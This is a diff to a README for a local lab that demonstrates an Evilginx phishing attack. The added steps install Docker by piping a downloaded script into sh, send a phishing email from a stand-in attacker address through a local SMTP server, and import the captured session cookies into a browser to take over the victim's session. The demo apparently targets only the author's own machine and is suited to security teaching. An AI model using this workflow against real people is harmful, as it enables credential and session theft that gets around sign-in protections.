@@ -64,7 +64,7 @@ login:
 ```
 127.0.0.1 demo.hno1an.com
 ```
-# Attack Instructions
+# Attack Configuration
 
 - Start Evilginx
 
@@ -91,10 +91,43 @@ Note that this domain must match the one you added to `/etc/hosts`
 : phishlets unhide demo
 ```
 
+- In another terminal, `cd` to the `mail` directory and run:
+
+```shell
+# if Docker is not installed:
+curl https://get.docker.com | sh
+
+sudo docker compose up -d
+```
+
+- When this command finishes, you will have a simple webmail interface at `https://localhost:8080`
+- Now, send a phishing email to the victim (ourselves):
+
+```shell
+curl --url "smtp://localhost:8025" \
+  --mail-from "attacker@attacker.com" \
+  --mail-rcpt "victim@victim.com" \
+  --upload-file - <<'EOF'
+Subject: Test
+From: attacker@attacker.com
+To: victim@victim.com
+Date: $(date -R)
+
+phishing link here
+EOF
+```
+
+# Playing the victim
+
+Click the link in the email and log in as if you were the victim. Notice how there appears to be nothing unusual about the sign-in - it is identical to as if you were signing in directly to the application in a legitimate way.
+
 # Using the captured information
+
+Back in the Evilginx process, run:
 
 ```shell
 : sessions
 ```
+
 Note the number of the session and then rerun 'sessions' with the number after. Copy the output. In a web browser, download the Cookie Editor extension, press the import button, and paste the output from Evilginx.
 
